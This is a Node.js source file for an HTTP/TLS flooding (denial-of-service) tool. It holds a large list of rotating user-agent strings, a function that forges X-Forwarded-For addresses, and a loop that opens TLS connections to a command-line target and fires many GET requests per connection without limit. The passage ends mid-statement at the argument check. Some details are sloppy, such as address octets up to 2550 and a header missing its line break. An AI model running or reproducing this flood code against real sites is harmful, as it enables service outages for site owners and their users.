const tls = require('tls'),
    { constants } = require('crypto'),
        url = require('url'),
            cluster = require('cluster'),
                path = require('path');

const UAs = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
     "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
     "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
 	"Mozilla/4.0 (X11; MSIE 6.0; i686; .NET CLR 1.1.4322; .NET CLR 2.0.50727; FDM)",
	"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 6.0)",
	"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.2)",
	"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.0)",
	"Mozilla/4.0 (Windows;  MSIE 6.0;  Windows NT 5.1;  SV1; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (MSIE 6.0; Windows NT 5.1)",
	"Mozilla/4.0 (MSIE 6.0; Windows NT 5.0)",
	"Mozilla/4.0 (compatible;MSIE 6.0;Windows 98;Q312461)",
	"Mozilla/4.0 (Compatible; Windows NT 5.1; MSIE 6.0) (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; U; MSIE 6.0; Windows NT 5.1) (Compatible;  ;  ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; U; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3; Tablet PC 2.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB6.5; QQDownload 534; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
	"More Internet Explorer 6.0 user agents strings -->>",
	"Mozilla/4.0 (compatible; MSIE 5.5b1; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.9; SiteCoach 1.0)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8; SiteCoach 1.0)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows 98; SiteKiosk 4.8)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows 95; SiteKiosk 4.8)",
	"Mozilla/4.0 (compatible;MSIE 5.5; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 5.5;)",
	"Mozilla/4.0 (Compatible; MSIE 5.5; Windows NT5.0; Q312461; SV1; .NET CLR 1.1.4322; InfoPath.2)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT5)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; chromeframe/12.0.742.100; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.5)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; FDM)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322) (Compatible;  ;  ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
	"More Internet Explorer 5.5 user agents strings -->>",
	"Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.22; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.21; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.2; Mac_PowerPC)",
	" Mozilla/4.0 (compatible; MSIE 5.2; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC Mac OS; en)",
	"Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC)",
	" Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
	" Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.14; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.12; Mac_PowerPC)",
	" Mozilla/4.0 (compatible; MSIE 5.12; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.05; Windows NT 4.0)",
	"Mozilla/4.0 (compatible; MSIE 5.05; Windows NT 3.51)",
	"Mozilla/4.0 (compatible; MSIE 5.05; Windows 98; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; YComp 5.0.0.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; Hotbar 4.1.8.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; DigExt)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; .NET CLR 1.0.3705)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; MSIECrawler)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; Hotbar 4.2.8.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; Hotbar 3.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.4)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0; Hotbar 4.1.8.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.6)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.3; Wanadoo 5.5)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.1)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1; .NET CLR 1.1.4322; .NET CLR 1.0.3705; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Q312461; T312461)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Q312461)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; MSIECrawler)",
	"More Internet Explorer 5.01 user agents strings -->>",
	"Mozilla/4.0 (compatible; MSIE 5.0b1; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)",
	"Mozilla/4.0(compatible; MSIE 5.0; Windows 98; DigExt)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT;)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.2.6)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.2.5)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.0.0)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; Hotbar 4.1.8.0)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; Hotbar 3.0)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; .NET CLR 1.0.3705)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.04506.648; .NET4.0C; .NET4.0E)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.9; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.2; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.0)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98;)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; YComp 5.0.2.4)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; Hotbar 3.0)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt; YComp 5.0.2.6; yplus 1.0)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt; YComp 5.0.2.6)",
	"More Internet Explorer 5.0 user agents strings -->>",
	"Mozilla/4.0 (compatible; MSIE 4.5; Windows NT 5.1; .NET CLR 2.0.40607)",
	"Mozilla/4.0 (compatible; MSIE 4.5; Windows 98; )",
	"Mozilla/4.0 (compatible; MSIE 4.5; Mac_PowerPC)",
	" Mozilla/4.0 (compatible; MSIE 4.5; Mac_PowerPC)",
	"Mozilla/4.0 PPC (compatible; MSIE 4.01; Windows CE; PPC; 240x320; Sprint:PPC-6700; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows NT 5.0)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint;PPC-i830; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint; SCH-i830; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SPH-ip830w; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SPH-ip320; Smartphone; 176x220)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SCH-i830; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SCH-i320; Smartphone; 176x220)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:PPC-i830; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone; 176x220)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; Sprint:PPC-6700; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; PPC)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows 98; Hotbar 3.0)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows 98; DigExt)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Mac_PowerPC)",
	"More Internet Explorer 4.01 user agents strings -->>",
	"Mozilla/4.0 WebTV/2.6 (compatible; MSIE 4.0)",
	"Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)",
	"Mozilla/4.0 (compatible; MSIE 4.0; Windows 98 )",
	"Mozilla/4.0 (compatible; MSIE 4.0; Windows 95; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 4.0; Windows 95)",
	"Mozilla/4.0 (Compatible; MSIE 4.0)",
	"Mozilla/2.0 (compatible; MSIE 4.0; Windows 98)",
	"Mozilla/2.0 (compatible; MSIE 3.03; Windows 3.1)",
	"Mozilla/2.0 (compatible; MSIE 3.02; Windows 3.1)",
	"Mozilla/2.0 (compatible; MSIE 3.01; Windows 95)",
	" Mozilla/2.0 (compatible; MSIE 3.01; Windows 95)",
	"Mozilla/2.0 (compatible; MSIE 3.0B; Windows NT)",
	"Mozilla/3.0 (compatible; MSIE 3.0; Windows NT 5.0)",
	"Mozilla/2.0 (compatible; MSIE 3.0; Windows 95)",
	"Mozilla/2.0 (compatible; MSIE 3.0; Windows 3.1)",
	"Mozilla/4.0 (compatible; MSIE 2.0; Windows NT 5.0; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
	"Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)",
	"Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)",
	"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
	"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
	"Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
	"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
	"Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
	"Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
	"Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
	"Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00",
	"Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0",
	"Opera/9.80 (Windows NT 6.1; WOW64; U; pt) Presto/2.10.229 Version/11.62",
	"Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.10.229 Version/11.62",
	"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
	"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; de) Presto/2.9.168 Version/11.52",
	"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.9.168 Version/11.51",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; de) Opera 11.51",
	"Opera/9.80 (X11; Linux x86_64; U; fr) Presto/2.9.168 Version/11.50",
	"Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50",
	"Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11",
	"Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.8.131 Version/11.11",
	"Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/5.0 Opera 11.11",
	"Opera/9.80 (X11; Linux x86_64; U; bg) Presto/2.8.131 Version/11.10",
	"Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10",
	"Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10",
	"Opera/9.80 (Windows NT 6.1; Opera Tablet/15165; U; en) Presto/2.8.149 Version/11.1",
	"Opera/9.80 (X11; Linux x86_64; U; Ubuntu/10.10 (maverick); pl) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (X11; Linux i686; U; ja) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (X11; Linux i686; U; fr) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 6.1; U; en-US) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.7.62 Version/11.01",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Vers",
	"Mozilla/5.0 (Windows NT 6.1; U; nl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01",
	"Mozilla/5.0 (Windows NT 6.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
	"Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (X11; Linux i686; U; it) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.00",
	"Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (Windows NT 6.1; U; ko) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (Windows NT 6.1; U; fi) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (Windows NT 6.1 x64; U; en) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (Windows NT 6.0; U; en) Presto/2.7.39 Version/11.00",
	"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00",
	"Opera/9.80 (Windows NT 5.1; U; MRA 5.5 (build 02842); ru) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (Windows NT 5.1; U; it) Presto/2.7.62 Version/11.00",
	"Mozilla/5.0 (Windows NT 6.0; U; ja; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
	"Mozilla/5.0 (Windows NT 5.1; U; pl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
	"Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
	"Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.6.31 Version/10.70",
	"Mozilla/5.0 (Windows NT 5.2; U; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
	"Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
	"Opera/9.80 (Windows NT 5.2; U; zh-cn) Presto/2.6.30 Version/10.63",
	"Opera/9.80 (Windows NT 5.2; U; en) Presto/2.6.30 Version/10.63",
	"Opera/9.80 (Windows NT 5.1; U; MRA 5.6 (build 03278); ru) Presto/2.6.30 Version/10.63",
	"Opera/9.80 (Windows NT 5.1; U; pl) Presto/2.6.30 Version/10.62",
	"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
	"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; de) Opera 10.62",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; en) Opera 10.62",
	"Opera/9.80 (X11; Linux i686; U; pl) Presto/2.6.30 Version/10.61",
	"Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.6.30 Version/10.61",
	"Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.30 Version/10.61",
	"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.6.30 Version/10.61",
	"Opera/9.80 (Windows NT 6.0; U; it) Presto/2.6.30 Version/10.61",
	"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.6.30 Version/10.61",
	"Opera/9.80 (Windows 98; U; de) Presto/2.6.30 Version/10.61",
	"Opera/9.80 (Macintosh; Intel Mac OS X; U; nl) Presto/2.6.30 Version/10.61",
	"Opera/9.80 (X11; Linux i686; U; en) Presto/2.5.27 Version/10.60",
	"Opera/9.80 (Windows NT 6.0; U; nl) Presto/2.6.30 Version/10.60",
	"Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60",
	"Opera/10.60 (Windows NT 5.1; U; en-US) Presto/2.6.30 Version/10.60",
	"Opera/9.80 (X11; Linux i686; U; it) Presto/2.5.24 Version/10.54",
	"Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.5.24 Version/10.53",
	"Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
	"Mozilla/5.0 (Windows NT 5.1; U; Firefox/5.0; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
	"Mozilla/5.0 (Windows NT 5.1; U; Firefox/4.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
	"Mozilla/5.0 (Windows NT 5.1; U; Firefox/3.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; ko) Opera 10.53",
	"Opera/9.80 (Windows NT 6.1; U; fr) Presto/2.5.24 Version/10.52",
	"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.5.22 Version/10.51",
	"Opera/9.80 (Windows NT 6.0; U; cs) Presto/2.5.22 Version/10.51",
	"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
	"Opera/9.80 (Linux i686; U; en) Presto/2.5.22 Version/10.51",
	"Mozilla/5.0 (Windows NT 6.1; U; en-GB; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
	"Mozilla/5.0 (Linux i686; U; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
	"Mozilla/4.0 (compatible; MSIE 8.0; Linux i686; en) Opera 10.51",
	"Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.5.22 Version/10.50",
	"Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.5.22 Version/10.50",
	"Opera/9.80 (Windows NT 6.1; U; sk) Presto/2.6.22 Version/10.50",
	"Opera/9.80 (Windows NT 6.1; U; ja) Presto/2.5.22 Version/10.50",
	"Opera/9.80 (Windows NT 6.0; U; zh-cn) Presto/2.5.22 Version/10.50",
	"Opera/9.80 (Windows NT 5.1; U; sk) Presto/2.5.22 Version/10.50",
	"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.22 Version/10.50",
	"Opera/10.50 (Windows NT 6.1; U; en-GB) Presto/2.2.2",
	"Opera/9.80 (S60; SymbOS; Opera Tablet/9174; U; en) Presto/2.7.81 Version/10.5",
	"Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (X11; Linux x86_64; U; it) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (Windows NT 6.1; U; de) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (Windows NT 6.0; U; Gecko/20100115; pl) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (Windows NT 5.1; U; de) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.10",
	"Mozilla/5.0 (Windows NT 6.0; U; tr; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 10.10",
	"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; tr) Opera 10.10",
	"Opera/9.80 (X11; Linux x86_64; U; en-GB) Presto/2.2.15 Version/10.01",
];

const getRandomNumberBetween = (min, max) => {
    return Math.floor(Math.random() * (max - min + 1) + min);
}

const ip_spoofing = () =>{
    return getRandomNumberBetween(1, 2550) + "." + getRandomNumberBetween(1, 2550) + "." + getRandomNumberBetween(1, 2550) + "." + getRandomNumberBetween(1, 2550)
}

function flood(){
    tls.authorized = true;
    tls.sync = true;
    var TlsConnection = tls.connect({
      ciphers: "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA",
      secureProtocol: ['TLSv1_2_method', 'TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2', 'TLS_OP_NO_TLS_1_1', 'TLS_OP_NO_TLS_1_0'],
      honorCipherOrder: true,
      requestCert: false,
      host: parsed.host,
      port: 443,
      secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv1,
      servername: parsed.host,
      secure: true,
      rejectUnauthorized: false
    }, function () {
      for (let i = 0; i < process.argv[4]; i++) {
        TlsConnection.setKeepAlive(true, 10000)
        TlsConnection.setTimeout(10000);
        TlsConnection.write(`GET ${parsed.path}` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: ' + parsed.href + '\r\nOrigin: ' + parsed.href + '\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nX-Forwarded-For: ' + ip_spoofing() + `Cache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n`);
      }
    }).on('disconnected', () => {
        TlsConnection.destroy();
        return delete TlsConnection
    }).on('timeout', () => {
        TlsConnection.destroy();
        return delete TlsConnection
    }).on('error', () => {
        TlsConnection.destroy();
        return delete TlsConnection
    }).on('data', () => {
        setTimeout(function () {
            TlsConnection.destroy();
            return delete TlsConnection
        }, 10000);
    }).on('end', () => {
        TlsConnection.destroy();
        return delete TlsConnection
    });
}

function runflood(){
    setInterval(() => {
        flood();
        })
}

if (process.argv.length !== 6){
    console.log(`
